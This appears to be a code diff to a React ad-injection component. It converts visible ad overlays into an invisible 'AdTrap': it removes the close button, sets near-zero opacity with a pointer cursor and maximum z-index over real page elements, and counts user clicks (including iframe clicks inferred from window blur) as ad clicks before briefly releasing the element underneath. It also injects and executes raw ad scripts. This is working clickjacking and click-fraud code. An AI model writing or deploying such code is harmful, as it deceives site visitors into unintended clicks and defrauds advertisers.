@@ -38,10 +38,16 @@ export default function CustomAdInjector() {
                             const overlay = document.createElement('div');
                             overlay.id = adId;
                             overlay.className = 'custom-ad-overlay';
+                            overlay.dataset.hover = 'false'; // Track hover state
+
+                            // Styles for "Invisible Trap"
                             overlay.style.position = 'absolute';
-                            overlay.style.zIndex = '2147483647'; // Max z-index to ensure visibility
+                            overlay.style.zIndex = '2147483647'; // Max visibility
                             overlay.style.overflow = 'hidden';
-                            overlay.style.pointerEvents = 'auto'; // Ad is clickable
+                            overlay.style.cursor = 'pointer'; // Show pointer so user thinks it's clickable
+                            overlay.style.opacity = '0.001'; // Invisible but interactable
+                            overlay.style.pointerEvents = 'auto';
+                            overlay.style.background = 'rgba(0,0,0,0.001)'; // Slight background for click capture
 
                             // Initial Position Sync
                             const updatePosition = () => {
@@ -58,37 +64,11 @@ export default function CustomAdInjector() {
 
                             updatePosition();
 
-                            // Add Close Button
-                            const closeBtn = document.createElement('button');
-                            closeBtn.innerHTML = '×';
-                            closeBtn.style.position = 'absolute';
-                            closeBtn.style.top = '-10px';
-                            closeBtn.style.right = '-10px';
-                            closeBtn.style.width = '24px';
-                            closeBtn.style.height = '24px';
-                            closeBtn.style.background = 'red';
-                            closeBtn.style.color = 'white';
-                            closeBtn.style.border = '2px solid white';
-                            closeBtn.style.borderRadius = '50%';
-                            closeBtn.style.fontSize = '16px';
-                            closeBtn.style.fontWeight = 'bold';
-                            closeBtn.style.cursor = 'pointer';
-                            closeBtn.style.display = 'flex';
-                            closeBtn.style.alignItems = 'center';
-                            closeBtn.style.justifyContent = 'center';
-                            closeBtn.style.zIndex = '2147483647'; // Ensure button is on top of ad content
-                            closeBtn.style.boxShadow = '0 2px 5px rgba(0,0,0,0.5)';
-
-                            closeBtn.onclick = (e) => {
-                                e.stopPropagation();
-                                overlay.remove();
-                            };
-
-                            overlay.appendChild(closeBtn);
-
                             // Inject Raw Code
                             const contentWrapper = document.createElement('div');
                             contentWrapper.innerHTML = ad.rawCode;
+                            contentWrapper.style.width = '100%';
+                            contentWrapper.style.height = '100%';
                             overlay.appendChild(contentWrapper);
 
                             // Execute Scripts
@@ -102,11 +82,19 @@ export default function CustomAdInjector() {
                                 oldScript.parentNode?.replaceChild(newScript, oldScript);
                             });
 
+                            // Hover Tracking for Iframe Click Detection
+                            overlay.addEventListener('mouseenter', () => { overlay.dataset.hover = 'true'; });
+                            overlay.addEventListener('mouseleave', () => { overlay.dataset.hover = 'false'; });
+
+                            // Direct Click Handling (for non-iframe ads like div/a)
+                            overlay.addEventListener('click', () => {
+                                console.log('[AdTrap] Click detected on content');
+                                triggerCooldown(overlay);
+                            });
+
                             // Keep synced
                             window.addEventListener('resize', updatePosition);
                             window.addEventListener('scroll', updatePosition);
-
-                            // ResizeObserver for element changes
                             const resizeObserver = new ResizeObserver(updatePosition);
                             resizeObserver.observe(targetEl);
 
@@ -126,10 +114,40 @@ export default function CustomAdInjector() {
             }
         };
 
+        // Cooldown Logic: Disable overlay for 10s
+        const triggerCooldown = (overlay: HTMLElement) => {
+            console.log('[AdTrap] Triggering 10s cooldown for:', overlay.id);
+            overlay.style.pointerEvents = 'none'; // Unlock button underneath
+
+            setTimeout(() => {
+                console.log('[AdTrap] Cooldown over, reactivating:', overlay.id);
+                overlay.style.pointerEvents = 'auto'; // Block again
+            }, 10000);
+        };
+
+        // Global Blur Listener for Iframes
+        const handleWindowBlur = () => {
+            // Check if any active overlay is currently hovered
+            const hoveredOverlay = document.querySelector('.custom-ad-overlay[data-hover="true"]');
+            if (hoveredOverlay) {
+                console.log('[AdTrap] Window blur detected over ad => Iframe Clicked');
+                // Trigger cooldown on the specific overlay
+                // Note: triggerCooldown is defined in closure, we can't access it here easily unless we attach it to DOM or move definition out.
+                // Re-implementing simplified logic here for robustness:
+                (hoveredOverlay as HTMLElement).style.pointerEvents = 'none';
+                setTimeout(() => {
+                    (hoveredOverlay as HTMLElement).style.pointerEvents = 'auto';
+                }, 10000);
+            }
+        };
+
+        window.addEventListener('blur', handleWindowBlur);
+
         injectCustomAds();
 
-        // Cleanup on unmount or route change (optional, but good for SPA)
+        // Cleanup
         return () => {
+            window.removeEventListener('blur', handleWindowBlur);
             const overlays = document.querySelectorAll('.custom-ad-overlay');
             overlays.forEach(el => el.remove());
         };
